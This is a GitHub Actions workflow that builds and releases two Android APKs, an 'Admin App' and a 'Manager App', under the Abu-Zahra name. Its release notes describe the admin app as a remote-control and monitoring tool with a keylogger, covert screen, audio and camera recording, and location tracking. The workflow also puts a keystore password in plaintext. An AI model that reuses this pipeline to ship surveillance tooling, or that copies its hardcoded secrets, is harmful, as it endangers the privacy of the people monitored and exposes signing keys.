name: Build Android APKs

on:
  push:
    branches: [main]
    paths:
      - 'Admin-App/**'
      - 'Android-App/**'
      - '.github/workflows/build.yml'
  workflow_dispatch:

jobs:
  build-admin:
    name: Build Admin App
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: Setup Android SDK
        uses: android-actions/setup-android@v3

      - name: Accept SDK Licenses
        run: |
          yes | sdkmanager --licenses > /dev/null 2>&1 || true

      - name: Install SDK Platform 34
        run: |
          sdkmanager "platforms;android-34"
          sdkmanager "build-tools;34.0.0"

      # === طباعة SHA-1 من ملف التوقيع الثابت ===
      - name: Print SHA-1 from Permanent Keystore
        run: |
          echo "============================================================"
          echo "          FIREBASE SHA-1 (from release.keystore)"
          echo "============================================================"
          keytool -list -v -keystore Admin-App/release.keystore -alias abuzahra -storepass abuzahra2024 | grep "SHA1:"
          echo "============================================================"

      - name: Validate Configs
        working-directory: Admin-App
        run: |
          if [ ! -f settings.gradle ]; then
            echo "rootProject.name = 'AbuAlZahra-Admin'" > settings.gradle
            echo "include ':app'" >> settings.gradle
          fi
          if [ ! -f gradle.properties ]; then
            echo "org.gradle.jvmargs=-Xmx2048m" > gradle.properties
            echo "android.useAndroidX=true" >> gradle.properties
          fi

      # === بناء Release APK مباشرة (يستخدم release.keystore من build.gradle) ===
      - name: Build Admin App (Release)
        working-directory: Admin-App
        run: |
          chmod +x gradlew
          ./gradlew :app:assembleRelease --no-daemon

      - name: Upload Admin APK
        uses: actions/upload-artifact@v4
        with:
          name: Admin-App-APK
          path: Admin-App/app/build/outputs/apk/release/app-release.apk

  build-manager:
    name: Build Manager App
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: Build Manager App (Debug)
        working-directory: Android-App
        run: |
          chmod +x gradlew
          ./gradlew assembleDebug

      - name: Upload Manager APK
        uses: actions/upload-artifact@v4
        with:
          name: Android-App-APK
          path: Android-App/app/build/outputs/apk/debug/*.apk

  release:
    name: Create GitHub Release
    needs: [build-admin, build-manager]
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - uses: actions/checkout@v4

      - name: Get Version
        id: version
        run: |
          VERSION=$(grep "versionName" Admin-App/app/build.gradle | head -1 | sed "s/.*'\([^']*\)'.*/\1/")
          echo "version=$VERSION" >> $GITHUB_OUTPUT

      - name: Download all artifacts
        uses: actions/download-artifact@v4

      - name: Rename APKs
        run: |
          mv Admin-App-APK/*.apk "AbuZahra-Admin-v${{ steps.version.outputs.version }}.apk" 2>/dev/null || true
          mv Android-App-APK/*.apk AbuZahra-Manager-v3.5.0.apk 2>/dev/null || true

      - name: Create Release
        uses: softprops/action-gh-release@v2
        with:
          tag_name: "v${{ steps.version.outputs.version }}-${{ github.run_number }}"
          name: "Abu-Zahra v${{ steps.version.outputs.version }} Build #${{ github.run_number }}"
          body: |
            ## Abu-Zahra Admin & Manager Apps

            ### Admin App v${{ steps.version.outputs.version }}:
            - تسجيل دخول جوجل أصلي (اختيار الحساب من الجهاز)
            - Firebase Auth (Google Sign-In + Email/Password + Create Account)
            - All 8 command categories (116 commands)
            - Live Streaming (Screen/Camera/Audio)
            - Data Viewer (12 data types)
            - Monitoring (Keylogger, Screen/Audio Record, Camera, Location)
            - User Management
            - Command Parameter Dialogs (32 commands)
            - Permanent Link Code per email

            ### Manager App v3.5.0:
            - Updated Firebase configuration

            ### مفتاح SHA-1 (Admin App):
            `0A:27:6F:32:73:15:92:AF:77:06:03:F8:4C:81:48:00:45:75:F4:D4`
          files: |
            AbuZahra-Admin-v*.apk
            AbuZahra-Manager-v3.5.0.apk
          draft: false
          prerelease: false
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}